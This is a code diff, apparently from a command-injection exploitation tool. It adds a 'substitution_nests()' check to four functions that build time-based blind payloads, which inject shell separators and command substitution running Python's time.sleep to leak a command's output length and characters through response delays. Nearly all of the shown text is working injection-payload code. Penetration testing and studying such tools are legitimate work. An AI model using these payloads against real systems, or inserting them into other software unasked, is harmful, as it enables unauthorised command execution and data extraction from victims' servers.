@@ -419,7 +419,7 @@ def cmd_execution_alter_interpreter(separator, cmd, output_length, timesec, http
 
   else:
     settings.USER_APPLIED_CMD = cmd
-    if separator in (";", "\n", "\r\n"):
+    if separator in (";", "\n", "\r\n") and checks.substitution_nests():
       payload = (separator +
                  # Find the length of the output, using readline().
                  settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
@@ -510,7 +510,7 @@ def get_length_alter_interpreter(separator, cmd, candidate_length, timesec, http
 
   else:
     settings.USER_APPLIED_CMD = cmd
-    if separator in (";", "\n", "\r\n"):
+    if separator in (";", "\n", "\r\n") and checks.substitution_nests():
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "1=" + _py_length_expr(cmd) + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(candidate_length) + "<=${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
@@ -627,7 +627,7 @@ def get_char_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timesec
 
   else:
     settings.USER_APPLIED_CMD = cmd
-    if separator in (";", "\n", "\r\n"):
+    if separator in (";", "\n", "\r\n") and checks.substitution_nests():
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + _py_ordinal_expr(cmd, num_of_chars) + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + "${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
@@ -663,7 +663,7 @@ def fp_result_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timese
       payload = checks.windows_probe(chain, cmd, "==", ascii_char, timesec)
 
   else:
-    if separator in (";", "\n", "\r\n"):
+    if separator in (";", "\n", "\r\n") and checks.substitution_nests():
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\"" + settings.CMD_SUB_SUFFIX + separator +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + "==${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
